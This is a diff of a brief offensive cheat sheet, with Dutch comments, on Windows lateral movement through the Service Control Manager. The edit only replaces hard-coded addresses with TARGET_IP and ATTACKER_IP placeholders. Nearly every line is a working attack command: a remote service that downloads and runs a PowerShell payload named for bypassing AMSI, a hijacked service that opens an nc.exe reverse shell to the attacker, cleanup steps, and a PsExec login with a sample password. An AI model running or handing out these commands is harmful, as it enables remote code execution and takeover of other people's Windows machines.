@@ -1,14 +1,14 @@
 # Lateral Movement via Service Control Manager (sc.exe)
 # Methode 1: Service aanmaken en starten
-sc \\TARGET create evilsvc binPath= "cmd.exe /c powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://10.0.0.1/payloads/amsi-shell.ps1')"
-sc \\TARGET start evilsvc
+sc \\TARGET_IP create evilsvc binPath= "cmd.exe /c powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/payloads/amsi-shell.ps1')"
+sc \\TARGET_IP start evilsvc
 # Methode 2: Bestaande service kapen (binPath overschrijven)
-sc \\TARGET config bestaandeservice binPath= "cmd.exe /c C:\Windows\tasks\nc.exe 10.0.0.1 443 -e cmd.exe"
-sc \\TARGET stop bestaandeservice
-sc \\TARGET start bestaandeservice
+sc \\TARGET_IP config bestaandeservice binPath= "cmd.exe /c C:\Windows\tasks\nc.exe ATTACKER_IP 443 -e cmd.exe"
+sc \\TARGET_IP stop bestaandeservice
+sc \\TARGET_IP start bestaandeservice
 # Stap 3: Opruimen na gebruik
-sc \\TARGET delete evilsvc
+sc \\TARGET_IP delete evilsvc
 # PsExec doet dit achter de schermen:
-.\PsExec64.exe \\TARGET -u DOMAIN\user -p Password123! -accepteula cmd.exe
+.\PsExec64.exe \\TARGET_IP -u DOMAIN\user -p Password123! -accepteula cmd.exe
 # Tip: Vereist admin rechten + SMB (445) + RPC (135)
 # Tip: Service timeout na 30 sec als binPath geen proper service is
